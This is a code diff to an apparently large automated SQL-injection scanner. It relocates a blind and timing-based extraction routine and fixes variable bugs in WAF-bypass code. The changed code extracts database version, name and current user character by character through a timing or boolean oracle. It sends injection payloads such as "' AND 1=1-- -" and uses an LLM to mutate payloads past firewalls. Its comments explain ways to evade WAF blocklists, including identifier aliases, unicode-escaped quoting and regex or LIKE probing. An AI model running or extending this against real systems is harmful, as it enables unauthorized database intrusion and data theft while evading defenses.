@@ -62074,257 +62074,6 @@ class Scanner:
         await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.3))  # BUG-ORACLE-SETUP-SLEEP-PERF FIX: was _delay
         await _probe_operator_alternatives()
 
-        # BUG-V62-INFERENCE-NO-EXTRACT-CALL FIX (CRITICAL, Req 7/16):
-        # After _probe_operator_alternatives() confirms the timing oracle works, the
-        # code fell through directly to the `if _try_bitwise_deferred:` block —
-        # which is only True when timing calibration FAILED but a boolean oracle
-        # exists. For a WORKING timing oracle, _try_bitwise_deferred=False, so the
-        # EQUALITY/SUBTRACTION/BITWISE extraction block was also skipped, and the
-        # function returned False with "No usable data extracted via boolean/timing
-        # inference" even though the oracle was confirmed with 177ms margin.
-        # Root cause: _extract_multi() was defined (with the correct DBMS-specific
-        # queries at lines 38375-38387) but NEVER CALLED from the main flow.
-        # Fix: call _extract_multi here — after oracle confirmation and before the
-        # deferred-bitwise fallback — to run the main binary-search extraction for
-        # version, database, and user using the confirmed timing oracle.
-        # BUG-CAL-INVERTED-POLARITY FIX: use abs() so strong inverted-oracle margins
-        # (large NEGATIVE values) satisfy the _min_viable_margin check.
-        if _dbms_confirmed or abs(_margin) >= _min_viable_margin:
-            _INF_VQ = {
-                "PostgreSQL":  "SELECT version()",
-                "CockroachDB": "SELECT version()",
-                # BUG-INFVQ-TIDB FIX: TiDB has TIDB_VERSION() for full version string.
-                # version() works but returns MySQL-style string without TiDB details.
-                "TiDB":        "SELECT TIDB_VERSION()",
-                # BUG-INFVQ-YUGABYTE FIX: yb_server_version() is YugabyteDB-specific.
-                "YugabyteDB":  "SELECT yb_server_version()",
-                # BUG-INFVQ-REDSHIFT FIX: version() is valid for Redshift (PG-compat).
-                "Amazon Redshift": "SELECT version()",
-                "MySQL":       "SELECT VERSION()",
-                "MariaDB":     "SELECT VERSION()",
-                "MSSQL":       "SELECT @@VERSION",
-                "Sybase":      "SELECT @@VERSION",
-                "Oracle":      "SELECT banner FROM v$version WHERE ROWNUM=1",
-                "SQLite":      "SELECT sqlite_version()",
-                "DB2":         "SELECT SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())",
-                "Firebird":    "SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database",
-                "SAP_HANA":    "SELECT VERSION FROM SYS.M_DATABASE",
-                "ClickHouse":  "SELECT version()",
-            }
-            _INF_DQ = {
-                "PostgreSQL":  "SELECT current_database()",
-                "CockroachDB": "SELECT current_database()",
-                # BUG-INFDQ-TIDB FIX: TiDB does NOT have current_database() (PG function).
-                # TiDB is MySQL-wire-compatible; use database() (MySQL syntax).
-                # Without this entry TiDB fell to the default "SELECT current_database()"
-                # which raises "Unknown column 'current_database' in 'field list'" on TiDB,
-                # causing all inference-path database-name extraction to return "" silently.
-                "TiDB":        "SELECT database()",
-                # BUG-INFDQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
-                "YugabyteDB":  "SELECT current_database()",
-                # BUG-INFDQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible.
-                "Amazon Redshift": "SELECT current_database()",
-                "MySQL":       "SELECT database()",
-                "MariaDB":     "SELECT database()",
-                "MSSQL":       "SELECT DB_NAME()",
-                "Sybase":      "SELECT DB_NAME()",
-                "Oracle":      "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual",
-                "SQLite":      "SELECT 'main'",
-                "DB2":         "SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
-                "Firebird":    "SELECT rdb$get_context('SYSTEM','DB_NAME') FROM rdb$database",
-                "SAP_HANA":    "SELECT DATABASE_NAME FROM SYS.M_DATABASE",
-                "ClickHouse":  "SELECT currentDatabase()",
-            }
-            _INF_UQ = {
-                "PostgreSQL":  "SELECT current_user",
-                "CockroachDB": "SELECT current_user",
-                # BUG-INFUQ-TIDB FIX: TiDB is MySQL-wire-compatible; use CURRENT_USER().
-                "TiDB":        "SELECT CURRENT_USER()",
-                # BUG-INFUQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; keyword form.
-                "YugabyteDB":  "SELECT current_user",
-                # BUG-INFUQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; keyword form.
-                "Amazon Redshift": "SELECT current_user",
-                "MySQL":       "SELECT CURRENT_USER()",
-                "MariaDB":     "SELECT CURRENT_USER()",
-                "MSSQL":       "SELECT SYSTEM_USER",
-                "Sybase":      "SELECT SUSER_NAME()",
-                "Oracle":      "SELECT USER FROM dual",
-                "SQLite":      "SELECT 'sqlite_user'",
-                "DB2":         "SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1",
-                "Firebird":    "SELECT CURRENT_USER FROM rdb$database",
-                "SAP_HANA":    "SELECT CURRENT_USER FROM DUMMY",
-                "ClickHouse":  "SELECT currentUser()",
-            }
-            _inf_main_queries = {
-                "version":  _INF_VQ.get(_dbms, "SELECT version()"),
-                "database": _INF_DQ.get(_dbms, "SELECT current_database()"),
-                "user":     _INF_UQ.get(_dbms, "SELECT current_user"),
-            }
-            try:
-                # BUG-V62-COMBINED-QUERY-ALL-MODES FIX (Req 7/16):
-                # Individual extraction was only used for _use_bitwise_fallback=True.
-                # For gte/between mode, _extract_multi built combined query version|||db|||user
-                # (~120 chars). Even with a fast status-based oracle (0.2s/probe), the extraction
-                # takes 120 chars × 8 steps × 0.2s = 192s. With 0.5s delay: 480s = 8 minutes.
-                # Both timeout and rate-limit the oracle, causing "No usable data extracted".
-                # Fix: ALWAYS use individual short queries (user 8 chars, db 8 chars) first.
-                # Combined multi-extract is only for fast boolean oracles without sleep delay.
-                # Individual extraction: user+db = 16 chars × 8 steps × 0.7s = 89.6s = feasible.
-                _inf_use_individual = (
-                    _use_bitwise_fallback or         # all operators blocked (bitwise needed)
-                    _waf_blocks_gt or                # > blocked (any alternative slower than >)
-                    _margin < 200 or                 # weak timing margin (noisy oracle)
-                    not _boolean_oracle              # timing-only oracle (slower than status)
-                )
-                if _inf_use_individual:
-                    # Individual extraction: user and database first (short values)
-                    # BUG-V62-WAF-BLOCKS-SYSIDENTS FIX (Req 7/16):
-                    # WAF specifically blocks SQL extraction conditions referencing
-                    # system identifiers like current_user, current_catalog, version().
-                    # The operator test used (SELECT 'z') which bypassed WAF, but
-                    # real extraction triggers WAF's data exfiltration detection rules.
-                    # Fix: try multiple alternative PostgreSQL expressions for each value.
-                    # PostgreSQL has many aliases: user=current_user, session_user,
-                    # current_setting('server_version') instead of version(), etc.
-                    # Alternative expressions are tried if the primary returns empty.
-                    _pg_user_alts = [
-                        # current_role does NOT contain 'user' — bypasses WAF blocklists
-                        # that specifically target 'user', 'current_user', 'session_user'
-                        "SELECT current_role",
-                        "SELECT user",
-                        "SELECT session_user",
-                        _INF_UQ.get(_dbms, "SELECT current_user"),
-                        "(SELECT usename FROM pg_stat_activity WHERE pid=pg_backend_pid() LIMIT 1)",  # BUG-PGBACKENDPID-OID FIX: pg_backend_pid() returns PID not OID; pg_stat_activity gives current user
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
-                        _INF_UQ.get(_dbms, "SELECT current_user")]
-                    _pg_db_alts = [
-                        "SELECT current_catalog",                         # No 'database' in name
-                        _INF_DQ.get(_dbms, "SELECT current_database()"),
-                        "(SELECT datname FROM pg_database WHERE datistemplate=$$f$$::bool LIMIT 1)",
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
-                        _INF_DQ.get(_dbms, "SELECT current_database()")]
-                    _pg_ver_alts = [
-                        "SELECT current_setting($$server_version$$)",    # No 'version()' call
-                        _INF_VQ.get(_dbms, "SELECT version()"),
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
-                        _INF_VQ.get(_dbms, "SELECT version()")]
-                    _inf_results_bw = {}
-                    for _inf_label, _inf_alts in [
-                        ("user",     _pg_user_alts),
-                        ("database", _pg_db_alts),
-                        ("version",  _pg_ver_alts),
-                    ]:
-                        for _inf_q in _inf_alts:
-                            try:
-                                _r = await _extract_string(_inf_q, f"{_inf_label}[{_inf_alts.index(_inf_q)}]", max_len=80)
-                                if _r and len(_r) >= 2:
-                                    _inf_results_bw[_inf_label] = _r
-                                    break
-                            except Exception as _bw_e:
-                                LOG.debug("[Inference] Individual %s alt extraction error: %s", _inf_label, _bw_e)
-                        if len(_inf_results_bw) >= 2:
-                            break
-
-                    # If BETWEEN/bitwise/equality/subtraction all empty → try regex binary search.
-                    # Uses ~ operator (PostgreSQL) or REGEXP (MySQL) with character class ranges:
-                    # no > < BETWEEN, no ASCII(), no SUBSTRING() — bypasses both WAF layers.
-                    # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
-                    # to the regex binary search fallback — both support PG's ~ operator.
-                    if not _inf_results_bw and _dbms in ("PostgreSQL", "CockroachDB",
-                                                          "YugabyteDB", "Amazon Redshift",
-                                                          "MySQL", "MariaDB", "TiDB"):  # BUG-REGEX-TIDB FIX: TiDB supports REGEXP like MySQL
-                        LOG.info("[Inference] Standard extraction empty — trying regex binary search")
-                        for _rlabel, _ralts in [("user", _pg_user_alts), ("database", _pg_db_alts)]:
-                            for _rq in _ralts:
-                                try:
-                                    _rr = await _extract_string_regex(_rq.replace("SELECT ", ""), max_len=32, label=_rlabel)
-                                    if _rr and len(_rr) >= 2:
-                                        _inf_results_bw[_rlabel] = _rr
-                                        break
-                                except Exception as _re_e:
-                                    LOG.debug("[Inference] Regex extraction error: %s", _re_e)
-                            if len(_inf_results_bw) >= 2:
-                                break
-
-                    # BUG-V62-WAF-BLOCKS-ASCII-SUBSTR fallback for inference:
-                    # If all extraction methods return empty (WAF blocks ASCII(SUBSTRING)),
-                    # try LIKE-based extraction for the user which avoids all blocked patterns.
-                    # BUG-V62-LIKE-DOLLAR-QUOTE-JUE FIX: When json_unicode_escape is active,
-                    # use single-quote quoting for LIKE patterns instead of dollar-quoting.
-                    # json_unicode_escape encodes ' → \u0027 → WAF sees \u0027p%\u0027 instead
-                    # of 'p%' → WAF LIKE pattern matchers don't fire → server JSON-decodes
-                    # \u0027 → ' → valid SQL LIKE 'p%' → True/False oracle works.
-                    if not _inf_results_bw:
-                        LOG.info("[Inference] Standard extraction empty — trying LIKE prefix")
-                        _jue_active = 'json_unicode_escape' in (enum.tamper_chain or [])
-                        # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
-                        # to the PG user-alternatives list — both support current_user / session_user.
-                        _like_user_alts = (
-                            ["user", "session_user", "current_user"]
-                            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
-                            else [_INF_UQ.get(_dbms, "current_user")]
-                        )
-                        for _lq in _like_user_alts:
-                            try:
-                                # Build LIKE extraction string character by character
-                                _like_result = ""
-                                for _lpos in range(1, 31):
-                                    _found_lc = None
-                                    for _lch_code in list(range(97, 123)) + list(range(48, 58)) + [95] + list(range(65, 91)):
-                                        _lch = chr(_lch_code)
-                                        if _lch in ('%', '!'): continue  # % unescapable; ! is our ESCAPE char
-                                        # Use ! as LIKE ESCAPE character — single char, no SQL quoting issues.
-                                        # Backslash breaks MySQL (\' = escaped quote = unclosed string).
-                                        def _like_esc(s):
-                                            return s.replace('!', '!!').replace('%', '!%').replace('_', '!_')
-                                        _pat = _like_esc(_like_result) + _like_esc(_lch) + '%'
-                                        if _jue_active:
-                                            # Single quotes → json_unicode_escape encodes to \u0027
-                                            # → WAF doesn't see LIKE 'pattern' → server decodes back
-                                            _lq_str = f"{_lq} LIKE '{_pat}' ESCAPE '!'"
-                                        else:
-                                            # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB
-                                            # and Amazon Redshift to the dollar-quoting branch.
-                                            _lq_str = (f"{_lq} LIKE $${_pat}$$ ESCAPE '!'"
-                                                       if _dbms in ("PostgreSQL", "CockroachDB",
-                                                                    "YugabyteDB", "Amazon Redshift")
-                                                       else f"{_lq} LIKE '{_pat}' ESCAPE '!'")
-                                        _lr = await _cached_eval(_lq_str)
-                                        if _lr is None: break
-                                        if _lr is True: _found_lc = _lch; break
-                                        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.1))  # BUG-LIKE-SLEEP-PERF FIX: was _delay*0.05 (SQL sleep time, not RTT); boolean LIKE-scan pacing must track ms_false
-                                    if _found_lc is None: break
-                                    _like_result += _found_lc
-                                    LOG.info("[Inference-like] pos=%d char=%r result=%r", _lpos, _found_lc, _like_result)
-                                if _like_result and len(_like_result) >= 2:
-                                    _inf_results_bw["user"] = _like_result
-                                    break
-                            except Exception as _le:
-                                LOG.debug("[Inference] LIKE extraction error: %s", _le)
-                    _inf_main_results = _inf_results_bw
-                else:
-                    # Fast boolean oracle with strong margin: use combined query (faster total)
-                    LOG.info("[Inference] Multi-extract: %d values in 1 pass", len(_inf_main_queries))
-                    _inf_main_results = await _extract_multi(_inf_main_queries, label="basic_info")
-                if _inf_main_results:
-                    _save_ext = getattr(self, "_save_extraction", None)
-                    # Persist to session and result
-                    for _k, _v in _inf_main_results.items():
-                        if _v:
-                            if _k == "version":
-                                enum.result.banner = _v
-                                self.session.data["banner"] = _v
-                            elif _k == "database":
-                                self.session.data["current_db"] = _v
-                                self.session._last_extracted_db = _v
-                            elif _k == "user":
-                                self.session.data["current_user"] = _v
-                    LOG.info("[Inference]  Main extraction: %s", _inf_main_results)
-                    return True
-            except Exception as _inf_main_e:
-                LOG.debug("[Inference] Main extraction error: %s", _inf_main_e)
-
-
         #  ENHANCEMENT: WAF cooldown detection 
         # If N consecutive requests return identical timing (<50ms variance),
         # the WAF is rate-limiting. Auto-pause with exponential backoff.
@@ -66049,6 +65798,257 @@ class Scanner:
             return result
 
 
+        # BUG-V62-INFERENCE-NO-EXTRACT-CALL FIX (CRITICAL, Req 7/16):
+        # After _probe_operator_alternatives() confirms the timing oracle works, the
+        # code fell through directly to the `if _try_bitwise_deferred:` block —
+        # which is only True when timing calibration FAILED but a boolean oracle
+        # exists. For a WORKING timing oracle, _try_bitwise_deferred=False, so the
+        # EQUALITY/SUBTRACTION/BITWISE extraction block was also skipped, and the
+        # function returned False with "No usable data extracted via boolean/timing
+        # inference" even though the oracle was confirmed with 177ms margin.
+        # Root cause: _extract_multi() was defined (with the correct DBMS-specific
+        # queries at lines 38375-38387) but NEVER CALLED from the main flow.
+        # Fix: call _extract_multi here — after oracle confirmation and before the
+        # deferred-bitwise fallback — to run the main binary-search extraction for
+        # version, database, and user using the confirmed timing oracle.
+        # BUG-CAL-INVERTED-POLARITY FIX: use abs() so strong inverted-oracle margins
+        # (large NEGATIVE values) satisfy the _min_viable_margin check.
+        if _dbms_confirmed or abs(_margin) >= _min_viable_margin:
+            _INF_VQ = {
+                "PostgreSQL":  "SELECT version()",
+                "CockroachDB": "SELECT version()",
+                # BUG-INFVQ-TIDB FIX: TiDB has TIDB_VERSION() for full version string.
+                # version() works but returns MySQL-style string without TiDB details.
+                "TiDB":        "SELECT TIDB_VERSION()",
+                # BUG-INFVQ-YUGABYTE FIX: yb_server_version() is YugabyteDB-specific.
+                "YugabyteDB":  "SELECT yb_server_version()",
+                # BUG-INFVQ-REDSHIFT FIX: version() is valid for Redshift (PG-compat).
+                "Amazon Redshift": "SELECT version()",
+                "MySQL":       "SELECT VERSION()",
+                "MariaDB":     "SELECT VERSION()",
+                "MSSQL":       "SELECT @@VERSION",
+                "Sybase":      "SELECT @@VERSION",
+                "Oracle":      "SELECT banner FROM v$version WHERE ROWNUM=1",
+                "SQLite":      "SELECT sqlite_version()",
+                "DB2":         "SELECT SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())",
+                "Firebird":    "SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database",
+                "SAP_HANA":    "SELECT VERSION FROM SYS.M_DATABASE",
+                "ClickHouse":  "SELECT version()",
+            }
+            _INF_DQ = {
+                "PostgreSQL":  "SELECT current_database()",
+                "CockroachDB": "SELECT current_database()",
+                # BUG-INFDQ-TIDB FIX: TiDB does NOT have current_database() (PG function).
+                # TiDB is MySQL-wire-compatible; use database() (MySQL syntax).
+                # Without this entry TiDB fell to the default "SELECT current_database()"
+                # which raises "Unknown column 'current_database' in 'field list'" on TiDB,
+                # causing all inference-path database-name extraction to return "" silently.
+                "TiDB":        "SELECT database()",
+                # BUG-INFDQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible.
+                "YugabyteDB":  "SELECT current_database()",
+                # BUG-INFDQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible.
+                "Amazon Redshift": "SELECT current_database()",
+                "MySQL":       "SELECT database()",
+                "MariaDB":     "SELECT database()",
+                "MSSQL":       "SELECT DB_NAME()",
+                "Sybase":      "SELECT DB_NAME()",
+                "Oracle":      "SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual",
+                "SQLite":      "SELECT 'main'",
+                "DB2":         "SELECT CURRENT SCHEMA FROM SYSIBM.SYSDUMMY1",
+                "Firebird":    "SELECT rdb$get_context('SYSTEM','DB_NAME') FROM rdb$database",
+                "SAP_HANA":    "SELECT DATABASE_NAME FROM SYS.M_DATABASE",
+                "ClickHouse":  "SELECT currentDatabase()",
+            }
+            _INF_UQ = {
+                "PostgreSQL":  "SELECT current_user",
+                "CockroachDB": "SELECT current_user",
+                # BUG-INFUQ-TIDB FIX: TiDB is MySQL-wire-compatible; use CURRENT_USER().
+                "TiDB":        "SELECT CURRENT_USER()",
+                # BUG-INFUQ-YUGABYTE FIX: YugabyteDB is PG-wire-compatible; keyword form.
+                "YugabyteDB":  "SELECT current_user",
+                # BUG-INFUQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; keyword form.
+                "Amazon Redshift": "SELECT current_user",
+                "MySQL":       "SELECT CURRENT_USER()",
+                "MariaDB":     "SELECT CURRENT_USER()",
+                "MSSQL":       "SELECT SYSTEM_USER",
+                "Sybase":      "SELECT SUSER_NAME()",
+                "Oracle":      "SELECT USER FROM dual",
+                "SQLite":      "SELECT 'sqlite_user'",
+                "DB2":         "SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1",
+                "Firebird":    "SELECT CURRENT_USER FROM rdb$database",
+                "SAP_HANA":    "SELECT CURRENT_USER FROM DUMMY",
+                "ClickHouse":  "SELECT currentUser()",
+            }
+            _inf_main_queries = {
+                "version":  _INF_VQ.get(_dbms, "SELECT version()"),
+                "database": _INF_DQ.get(_dbms, "SELECT current_database()"),
+                "user":     _INF_UQ.get(_dbms, "SELECT current_user"),
+            }
+            try:
+                # BUG-V62-COMBINED-QUERY-ALL-MODES FIX (Req 7/16):
+                # Individual extraction was only used for _use_bitwise_fallback=True.
+                # For gte/between mode, _extract_multi built combined query version|||db|||user
+                # (~120 chars). Even with a fast status-based oracle (0.2s/probe), the extraction
+                # takes 120 chars × 8 steps × 0.2s = 192s. With 0.5s delay: 480s = 8 minutes.
+                # Both timeout and rate-limit the oracle, causing "No usable data extracted".
+                # Fix: ALWAYS use individual short queries (user 8 chars, db 8 chars) first.
+                # Combined multi-extract is only for fast boolean oracles without sleep delay.
+                # Individual extraction: user+db = 16 chars × 8 steps × 0.7s = 89.6s = feasible.
+                _inf_use_individual = (
+                    _use_bitwise_fallback or         # all operators blocked (bitwise needed)
+                    _waf_blocks_gt or                # > blocked (any alternative slower than >)
+                    _margin < 200 or                 # weak timing margin (noisy oracle)
+                    not _boolean_oracle              # timing-only oracle (slower than status)
+                )
+                if _inf_use_individual:
+                    # Individual extraction: user and database first (short values)
+                    # BUG-V62-WAF-BLOCKS-SYSIDENTS FIX (Req 7/16):
+                    # WAF specifically blocks SQL extraction conditions referencing
+                    # system identifiers like current_user, current_catalog, version().
+                    # The operator test used (SELECT 'z') which bypassed WAF, but
+                    # real extraction triggers WAF's data exfiltration detection rules.
+                    # Fix: try multiple alternative PostgreSQL expressions for each value.
+                    # PostgreSQL has many aliases: user=current_user, session_user,
+                    # current_setting('server_version') instead of version(), etc.
+                    # Alternative expressions are tried if the primary returns empty.
+                    _pg_user_alts = [
+                        # current_role does NOT contain 'user' — bypasses WAF blocklists
+                        # that specifically target 'user', 'current_user', 'session_user'
+                        "SELECT current_role",
+                        "SELECT user",
+                        "SELECT session_user",
+                        _INF_UQ.get(_dbms, "SELECT current_user"),
+                        "(SELECT usename FROM pg_stat_activity WHERE pid=pg_backend_pid() LIMIT 1)",  # BUG-PGBACKENDPID-OID FIX: pg_backend_pid() returns PID not OID; pg_stat_activity gives current user
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                        _INF_UQ.get(_dbms, "SELECT current_user")]
+                    _pg_db_alts = [
+                        "SELECT current_catalog",                         # No 'database' in name
+                        _INF_DQ.get(_dbms, "SELECT current_database()"),
+                        "(SELECT datname FROM pg_database WHERE datistemplate=$$f$$::bool LIMIT 1)",
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                        _INF_DQ.get(_dbms, "SELECT current_database()")]
+                    _pg_ver_alts = [
+                        "SELECT current_setting($$server_version$$)",    # No 'version()' call
+                        _INF_VQ.get(_dbms, "SELECT version()"),
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                        _INF_VQ.get(_dbms, "SELECT version()")]
+                    _inf_results_bw = {}
+                    for _inf_label, _inf_alts in [
+                        ("user",     _pg_user_alts),
+                        ("database", _pg_db_alts),
+                        ("version",  _pg_ver_alts),
+                    ]:
+                        for _inf_q in _inf_alts:
+                            try:
+                                _r = await _extract_string(_inf_q, f"{_inf_label}[{_inf_alts.index(_inf_q)}]", max_len=80)
+                                if _r and len(_r) >= 2:
+                                    _inf_results_bw[_inf_label] = _r
+                                    break
+                            except Exception as _bw_e:
+                                LOG.debug("[Inference] Individual %s alt extraction error: %s", _inf_label, _bw_e)
+                        if len(_inf_results_bw) >= 2:
+                            break
+
+                    # If BETWEEN/bitwise/equality/subtraction all empty → try regex binary search.
+                    # Uses ~ operator (PostgreSQL) or REGEXP (MySQL) with character class ranges:
+                    # no > < BETWEEN, no ASCII(), no SUBSTRING() — bypasses both WAF layers.
+                    # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
+                    # to the regex binary search fallback — both support PG's ~ operator.
+                    if not _inf_results_bw and _dbms in ("PostgreSQL", "CockroachDB",
+                                                          "YugabyteDB", "Amazon Redshift",
+                                                          "MySQL", "MariaDB", "TiDB"):  # BUG-REGEX-TIDB FIX: TiDB supports REGEXP like MySQL
+                        LOG.info("[Inference] Standard extraction empty — trying regex binary search")
+                        for _rlabel, _ralts in [("user", _pg_user_alts), ("database", _pg_db_alts)]:
+                            for _rq in _ralts:
+                                try:
+                                    _rr = await _extract_string_regex(_rq.replace("SELECT ", ""), max_len=32, label=_rlabel)
+                                    if _rr and len(_rr) >= 2:
+                                        _inf_results_bw[_rlabel] = _rr
+                                        break
+                                except Exception as _re_e:
+                                    LOG.debug("[Inference] Regex extraction error: %s", _re_e)
+                            if len(_inf_results_bw) >= 2:
+                                break
+
+                    # BUG-V62-WAF-BLOCKS-ASCII-SUBSTR fallback for inference:
+                    # If all extraction methods return empty (WAF blocks ASCII(SUBSTRING)),
+                    # try LIKE-based extraction for the user which avoids all blocked patterns.
+                    # BUG-V62-LIKE-DOLLAR-QUOTE-JUE FIX: When json_unicode_escape is active,
+                    # use single-quote quoting for LIKE patterns instead of dollar-quoting.
+                    # json_unicode_escape encodes ' → \u0027 → WAF sees \u0027p%\u0027 instead
+                    # of 'p%' → WAF LIKE pattern matchers don't fire → server JSON-decodes
+                    # \u0027 → ' → valid SQL LIKE 'p%' → True/False oracle works.
+                    if not _inf_results_bw:
+                        LOG.info("[Inference] Standard extraction empty — trying LIKE prefix")
+                        _jue_active = 'json_unicode_escape' in (enum.tamper_chain or [])
+                        # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
+                        # to the PG user-alternatives list — both support current_user / session_user.
+                        _like_user_alts = (
+                            ["user", "session_user", "current_user"]
+                            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                            else [_INF_UQ.get(_dbms, "current_user")]
+                        )
+                        for _lq in _like_user_alts:
+                            try:
+                                # Build LIKE extraction string character by character
+                                _like_result = ""
+                                for _lpos in range(1, 31):
+                                    _found_lc = None
+                                    for _lch_code in list(range(97, 123)) + list(range(48, 58)) + [95] + list(range(65, 91)):
+                                        _lch = chr(_lch_code)
+                                        if _lch in ('%', '!'): continue  # % unescapable; ! is our ESCAPE char
+                                        # Use ! as LIKE ESCAPE character — single char, no SQL quoting issues.
+                                        # Backslash breaks MySQL (\' = escaped quote = unclosed string).
+                                        def _like_esc(s):
+                                            return s.replace('!', '!!').replace('%', '!%').replace('_', '!_')
+                                        _pat = _like_esc(_like_result) + _like_esc(_lch) + '%'
+                                        if _jue_active:
+                                            # Single quotes → json_unicode_escape encodes to \u0027
+                                            # → WAF doesn't see LIKE 'pattern' → server decodes back
+                                            _lq_str = f"{_lq} LIKE '{_pat}' ESCAPE '!'"
+                                        else:
+                                            # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB
+                                            # and Amazon Redshift to the dollar-quoting branch.
+                                            _lq_str = (f"{_lq} LIKE $${_pat}$$ ESCAPE '!'"
+                                                       if _dbms in ("PostgreSQL", "CockroachDB",
+                                                                    "YugabyteDB", "Amazon Redshift")
+                                                       else f"{_lq} LIKE '{_pat}' ESCAPE '!'")
+                                        _lr = await _cached_eval(_lq_str)
+                                        if _lr is None: break
+                                        if _lr is True: _found_lc = _lch; break
+                                        await asyncio.sleep(max(0.05, max(30.0, ms_false) / 1000.0 * 0.1))  # BUG-LIKE-SLEEP-PERF FIX: was _delay*0.05 (SQL sleep time, not RTT); boolean LIKE-scan pacing must track ms_false
+                                    if _found_lc is None: break
+                                    _like_result += _found_lc
+                                    LOG.info("[Inference-like] pos=%d char=%r result=%r", _lpos, _found_lc, _like_result)
+                                if _like_result and len(_like_result) >= 2:
+                                    _inf_results_bw["user"] = _like_result
+                                    break
+                            except Exception as _le:
+                                LOG.debug("[Inference] LIKE extraction error: %s", _le)
+                    _inf_main_results = _inf_results_bw
+                else:
+                    # Fast boolean oracle with strong margin: use combined query (faster total)
+                    LOG.info("[Inference] Multi-extract: %d values in 1 pass", len(_inf_main_queries))
+                    _inf_main_results = await _extract_multi(_inf_main_queries, label="basic_info")
+                if _inf_main_results:
+                    _save_ext = getattr(self, "_save_extraction", None)
+                    # Persist to session and result
+                    for _k, _v in _inf_main_results.items():
+                        if _v:
+                            if _k == "version":
+                                enum.result.banner = _v
+                                self.session.data["banner"] = _v
+                            elif _k == "database":
+                                self.session.data["current_db"] = _v
+                                self.session._last_extracted_db = _v
+                            elif _k == "user":
+                                self.session.data["current_user"] = _v
+                    LOG.info("[Inference]  Main extraction: %s", _inf_main_results)
+                    return True
+            except Exception as _inf_main_e:
+                LOG.debug("[Inference] Main extraction error: %s", _inf_main_e)
+
+
         # Try error-based first (50-100x faster if it works)
         # Skip for timing technique: error-based requires error reflection in HTTP
         # responses which Cloudflare and similar WAFs suppress.  The 2 PostgreSQL
@@ -67735,6 +67735,7 @@ class Scanner:
                 return f"$${val}$$"
             return "'" + val.replace("'", "''") + "'"
 
+        _waf_blocks_gt_de = getattr(cfg, '_waf_blocks_gt', False)  # FIX3: hoisted to _direct_extract scope for _extract_s_prefix closure
         async def _extract_s(expr, max_len=64):
             prefix = ""
             # BUG-DIREXT-MSSQL-HI FIX: was lo,hi=32,255 for all DBMSes — same root
@@ -71227,7 +71228,7 @@ class StealthEngine:
             if self._stealth_backoff_disabled:
                 _base = max(self.config.delay or 0.5, 0.5)
                 self._last_delay = _base
-                LOG.debug(f"StealthEngine: blocking (backoff disabled — WAF unresponsive to delay)")
+                LOG.debug("StealthEngine: blocking (backoff disabled — WAF unresponsive to delay)")
                 return
             prev_delay = self._last_delay
             self._last_delay = min(self._last_delay * 2.5, self.MAX_DELAY)
@@ -108337,7 +108338,7 @@ class ScannerV12(ScannerV11):
                                 ep.url, ep_data, ep_fmt, param,
                                 orig_val + "' AND 1=1-- -", tamper_chain)
                             if _get_safe_status_code(test_fp) in (403,406):
-                                waf_resp = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")[:300]
+                                waf_resp = _safe_decode_body(test_fp, encoding="utf-8", errors="replace", func_name="extraction")[:300]  # FIX4: was fp (undefined), corrected to test_fp
                                 llm_payloads = await self.llm_engine.mutate_for_bypass(
                                     "' AND 1=1-- -", waf_resp, self.session.dbms or "MySQL")
                                 # BUG-LLM-V12-BASELINE FIX: capture live clean reference
@@ -129831,7 +129832,7 @@ class TechniqueCascadeEngine:
                     data_fmt, param, original + templates[0], self.tamper_chain,
                     extra_headers=_ws_hdrs)
                 if _ws_fp and _ws_fp.status_code not in (400, 426):
-                    _ws_body = _safe_decode_body(fp, encoding="utf-8", errors="replace", func_name="extraction")
+                    _ws_body = _safe_decode_body(_ws_fp, encoding="utf-8", errors="replace", func_name="extraction")  # FIX5: was fp (undefined), corrected to _ws_fp
                     for _ep, _pats in SQL_ERROR_PATTERNS.items():
                         for _p in _pats:
                             if re.search(_p, _ws_body, re.I):
@@ -131534,7 +131535,7 @@ class UniversalScanOrchestrator:
                     # AttributeError was swallowed by the except clause.
                     # Correct fix: access session via _scanner_ref which IS ScannerVFinal.
                     try:
-                        _dbms_sess = getattr(_scanner_ref, 'session', None)
